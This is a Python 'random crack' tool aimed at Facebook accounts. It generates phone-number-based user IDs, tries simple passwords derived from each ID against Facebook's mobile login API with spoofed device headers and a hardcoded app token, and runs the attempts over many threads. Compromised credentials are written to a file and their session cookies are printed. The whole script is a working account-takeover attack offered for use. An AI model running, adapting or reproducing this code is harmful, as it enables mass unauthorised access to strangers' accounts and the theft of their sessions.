import os,sys,string,random,uuid,json,time
import requests
from concurrent.futures import ThreadPoolExecutor as tred
from requests.exceptions import ConnectionError
W = '\033[0m'   # White (default)
R = '\033[31m'  # Red
G = '\033[32m'  # Green
Y = '\033[33m'  # Yellow
B = '\033[34m'  # Blue
#=====================#
alive=0;loop=0;user=[];ugen=[]
import random
for x in range(10):
    us=f'Mozilla/5.0 (Linux; Android {random.randint(8,13)}; 21061119AG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(75,100)}.0.{random.randint(4000,6000)}.{random.randint(40,100)} Mobile Safari/537.36'
    ugen.append(us)
#Mozilla/5.0 (Linux; Android 13; 21061119AG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/375.0.0.7.111;]

def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
    
    
def clear():
    os.system('clear')
line = 40*f'{Y}─'

logo =f"""
{R}▗▄▄▄▄▖▗▖ ▗▖▗▖  ▗▖▗▄▖ ▗▖  ▗▖
{G}   ▗▞▘▐▌ ▐▌ ▝▚▞▘▐▌ ▐▌▐▛▚▖▐▌
{B} ▗▞▘  ▐▌ ▐▌  ▐▌ ▐▛▀▜▌▐▌ ▝▜▌
{Y}▐▙▄▄▄▖▝▚▄▞▘  ▐▌ ▐▌ ▐▌▐▌  ▐▌""" 

def info():
    print(logo)
    print(line)
    print(f'{W}[{G}•{W}] FACEBOOK : {G}MR{B}.{G}ZUYAN{W}')
    print(f'{W}[{G}•{W}] GITHUB : {G}Legendhj')
    print(f'{W}[{G}•{W}] TEAM : {G}XVSOULX')
    print(f'{W}[{G}•{W}] OWNER : {G}Z{B}U{Y}Y{R}A{W}N')
    print(line)
    

def main():
    clear()
    info()
    print(f'{W}[{G}1{W}] RANDOM CRACK')
    print(f'{W}[{G}2{W}] FOLLOW ME')
    print(f'{W}[{G}0{W}] EXIT TOOLS')
    print(line)
    option = input(f'{W}[{G}•{W}] CHOICE : ')
    if option in ['1','A','a']:
        BD_CRACK()
    elif option in ['2','B','b']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100023211708481&mibextid=ZbWKwL')
    else:
        print('👁️PLEASE SELECT COURTLY FUCK');time.sleep(2)
        main()
        
    
def BD_CRACK():
    clear()
    info()
    print(f'{W}[{G}•{W}] FOR EXAMPLE : [018]-[019]-[016]-[017]')
    print(line)
    code = input(f'{W}[{G}•{W}] ENTER YOUR CODE : ')
    print(line)
    print(f'{W}[{G}•{W}] FOR EXAMPLE : [10000]-[20000]-[50000]')
    print(line)
    limit = int(input(f'{W}[{G}•{W}] ENTER YOUR LIMIT : '))
    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZUYAN:
        clear()
        info()
        print(f'{W}[{G}•{W}] CRACK LIMIT : {limit}')
        print(f'{W}[{G}•{W}] CRACK CODE : {code}')
        print(f'{W}[{G}•{W}] CRACKING WITH ZUYAN')
        print(f'{W}[{G}•{W}] CRACKING HAS BEEN STARTED')
        print(line)
        for sex in user:
            uid = code+sex
            pwx = [sex[1:],uid,uid[:8],uid[:6],uid[:7],'bangladesh']
            ZUYAN.submit(crack,uid,pwx)
        

def crack(uid, pwx):
    global loop
    global alive
    try:
        for ps in pwx:
            adid = ''.join(random.choices(string.hexdigits, k=16))
            device_id = str(uuid.uuid4())
            ua = random.choice(ugen)  # Random User-Agent from generated list
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            # Console output
            sys.stdout.write(f'\r{W}[{B}➤{W}] {Y}CRACKING {W}[{G}{loop}{W}]<>[ALIVE:{G}{alive}{W}] ')
            sys.stdout.flush()
            
            # Data payload
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': uid,
                'password': ps,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            
            # Headers
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            try:
                response = requests.post(url, data=data, headers=headers).json()
                #print(response)
                if 'session_key' in response:
                    ids=str(response['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    print(f'\r\x1b[38;5;84m[LIVE] {uid} | {ps} CREATE DATE : {joined(ids)}\x1b[38;5;155m ')
                    print(f'\r\033[1;92m[\x1b[38;5;197mCOOKIE\033[1;92m] : \x1b[38;5;222m '+coki+'\x1b[38;5;223m')
                    open('/sdcard/MR_ALIVE.txt', 'a').write(f'{uid} | {ps}\n')
                    alive += 1
                    break
                elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                    print(f"\r{B}[DEAD] {uid} | {ps} ")
                    open('/sdcard/MR_DIE.txt', 'a').write(f'{uid} | {ps}\n')
                    break
            except Exception as e:
                pass
        loop += 1
    except Exception as e:
        pass

if __name__=="__main__":
    main()